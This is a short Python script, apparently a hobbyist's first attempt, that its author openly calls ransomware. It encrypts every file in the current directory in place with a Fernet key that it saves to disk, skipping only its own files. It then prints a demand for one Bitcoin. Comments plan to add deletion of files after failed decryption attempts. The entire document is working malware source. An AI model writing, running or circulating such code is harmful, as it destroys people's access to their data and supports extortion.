#!/usr/bin/env python3
# Name : NUCLEAR - Version 1.0
# Date : 11-12-22
# Auth : Skrypt Kiddie

# Note : This is a simple ransomware written in python
# and yes, I watched NetworkChucks video on how to
# make this. Decided to name it NUCLEAR because why
# not lol.

# To Do
# --> Delete the files after 10 failed attemps
#     of decrypting it
# --> Rename eveything from ransomware to NUCLEAR


import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "unlock.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("unlock.key", "wb") as unlock:
    unlock.write(key)

for file in files:
    with open(file, "rb") as files:
        contents = files.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as files:
        files.write(contents_encrypted)

print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")
